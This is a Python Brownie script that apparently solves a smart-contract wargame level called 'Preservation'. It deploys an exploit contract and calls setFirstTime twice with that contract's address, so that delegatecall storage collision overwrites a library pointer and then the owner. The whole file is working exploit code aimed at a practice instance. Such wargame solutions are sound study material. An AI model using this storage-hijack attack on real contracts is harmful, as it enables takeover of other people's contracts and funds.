from brownie import (
    Contract,
    Preservation,
    LibraryContract,
    PreservationExploit,
    accounts
)

INSTANCE_ADDRESS = "0xFb16bD2fFfa0300224eecD20925bbC9C48511A0D"
ACCOUNT1 = "straul"
ACCOUNT2 = "dev_only"


def get_account():
    account = accounts.load(ACCOUNT1)
    return account


def hack_preservation(account):
    preservation = Contract.from_abi("Preservation", INSTANCE_ADDRESS, Preservation.abi)
    #preservation = Preservation[-1]  # testing only
    evil_library = PreservationExploit.deploy({'from': account})

    print(f"Owner before hack: {preservation.owner()}")

    # call 'setFirstTime' with the address of evil_library converted to uint
    # timeZone1Library address will be changed to evil_library address
    uint_address = int(evil_library.address, 16)
    # call setTime from original library
    preservation.setFirstTime(uint_address, {'from': account})

    # call setTime from the evil library
    # a higher amount of gas is required, otherwise the tx would fail with out of gas
    preservation.setFirstTime(uint_address, {'from': account, 'gas': 999999})
    print(f"Owner after hack: {preservation.owner()}")


def deploy(account):
    library1 = LibraryContract.deploy({'from': account})
    library2 = LibraryContract.deploy({'from': account})
    Preservation.deploy(library1.address, library2.address, {'from': accounts.load(ACCOUNT2)})


def main():
    account = get_account()
    #deploy(account)  # testing only
    hack_preservation(account)